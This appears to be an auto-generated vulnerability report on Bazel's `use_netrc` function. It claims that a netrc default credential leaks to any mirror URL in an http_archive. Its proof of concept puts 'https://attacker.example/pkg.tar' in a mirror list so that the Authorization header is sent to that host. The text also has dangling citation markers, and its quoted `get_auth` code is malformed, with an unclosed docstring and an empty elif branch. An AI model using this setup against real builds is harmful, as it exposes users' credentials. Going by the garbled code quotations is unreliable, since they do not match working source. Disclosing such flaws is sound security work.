### Title
`use_netrc` sends the .netrc default credential to every mirror URL, including attacker-controlled ones - (File: tools/build_defs/repo/utils.bzl)

### Summary
`http_archive`/`http_file`/`http_jar` build one auth dict for *all* mirror URLs at once via `get_auth`, which calls `use_netrc`. `use_netrc` matches credentials by host, but when a URL's host isn't explicitly listed in the netrc file, it silently substitutes the netrc **default** entry (`machine` line with no name / `default` keyword) for that unrelated host [2](#0-1) . Because `http_archive` accepts a list of "mirror" URLs that are all tried with the same computed auth dict [3](#0-2) [4](#0-3) , any URL entry in that list — including one contributed by a less-trusted source (e.g., extra mirror/source URLs recorded in a lockfile-driven or third-party-registry-provided `source.json`, which is data, not root-repo Starlark) — receives the same default credentials intended for the user's primary/private host.

### Finding Description
`get_auth` builds one auth map for the whole set of `urls`/`url` passed to a repo rule [5](#0-4) . It calls `use_netrc(netrc, urls, auth_patterns)`. Inside `use_netrc`:

```
host = schemerest[1].split("/")[0].split(":")[0]
if host in netrc:
    authforhost = netrc[host]
elif "" in netrc:
    authforhost = netrc[""]
else:
    continue
```

`netrc[""]` is populated whenever the netrc file has a `default` entry (a common, documented pattern for “use these credentials everywhere else”), or when the parser assigns a machine name of `""` [6](#0-5) . The consequence is that the invariant "credentials are host-scoped" is broken: any URL supplied to `ctx.download`/`ctx.download_and_extract` that isn't for one of the explicitly named netrc machines is treated as eligible for the default credential, and Bazel will send that Authorization/Basic-auth header (or bearer token via `auth_patterns`) to that host over HTTP(S).

Because `http_archive` merges `url` + `urls` into one `source_urls` list and passes them all through `get_auth` in a single call [3](#0-2) , an attacker who can get one additional URL into that list — such as an extra mirror URL served from a less-trusted or compromised registry entry, or a URL an attacker-controlled dependency causes to be added as a "mirror" — will cause the resolved default netrc credential to be exfiltrated to their host during the mirror-fallback download attempt, before the (also-declared) `sha256`/`integrity` check ever validates content. Note the checksum only validates the downloaded bytes; it does nothing to prevent the credential from being sent to the wrong host in the first place, so the "declared sha256/integrity should stop it" bar doesn't apply here — the leak happens purely from the auth-header construction/host-matching logic, independent of content integrity.

### Impact Explanation
An unprivileged content publisher who can insert or influence any additional URL into a repo rule's URL list (a scenario within scope: an attacker-served registry entry, or a URL embedded in fetched lockfile/registry metadata that is later treated as a mirror) can cause the victim's netrc default password/bearer-token to be sent as an HTTP header to a host they control. This is credential exfiltration to an attacker-controlled host — one of the explicitly accepted vulnerability classes.

### Likelihood Explanation
Requires the victim to have a netrc file with a `default`/unnamed machine entry (a documented, supported Bazel-netrc configuration, not exotic) and requires an extra untrusted URL to reach the `urls` list for a rule that also matches to a host with real credentials. This is plausible for build setups combining a private artifact host (with default netrc credentials for convenience) with third-party or dependency-declared mirrors.

### Recommendation
`use_netrc` should not silently fall back to the default netrc entry for hosts that were not part of the URL set the credentials were originally scoped for, or at minimum should require explicit opt-in (e.g., via `auth_patterns`/host allow-list) before applying default credentials to a URL, and mirror URLs contributed from lower-trust sources (registries, lockfiles) should be evaluated for auth eligibility separately from user-declared primary URLs.

### Proof of Concept
1. Create a `.netrc` with only a default entry: `machine` default clause providing `password SECRET` (mirrors the shell test pattern already present in the repo) [7](#0-6) .
2. Define `http_archive(name="repo", urls=["https://trusted.example.com/pkg.tar", "https://attacker.example/pkg.tar"], sha256=...)`.
3. Run the build against a local HTTP listener on `attacker.example` and observe that the `Authorization`/basic-auth header built from the default netrc entry is sent to `attacker.example` on the mirror-fallback request, exactly as `test_use_netrc` in `starlark_repository_test.sh` demonstrates default-entry matching for arbitrary unlisted hosts [8](#0-7) .

```text
def get_auth(ctx, urls):
    """Utility function to obtain the correct auth dict for a list of urls from .netrc file.

    Support optional netrc and auth_patterns attributes if available.

    Args:
      ctx: The repository context of the repository rule calling this utility
        function.
      urls: the list of urls to read

    Returns:
      the auth dict which can be passed to repository_ctx.download

    if hasattr(ctx.attr, "netrc") and ctx.attr.netrc:
        netrc = read_netrc(ctx, ctx.attr.netrc)
    elif "NETRC" in ctx.os.environ:

    auth_patterns = {}
```

```text
def _get_source_urls(ctx):
    """Returns source urls provided via the url, urls attributes.

    Also checks that at least one url is provided."""
    if not ctx.attr.url and not ctx.attr.urls:
        fail("At least one of url and urls must be provided")

    source_urls = []
    if ctx.attr.urls:
        source_urls = ctx.attr.urls
    if ctx.attr.url:
        source_urls = [ctx.attr.url] + source_urls
    return source_urls
```
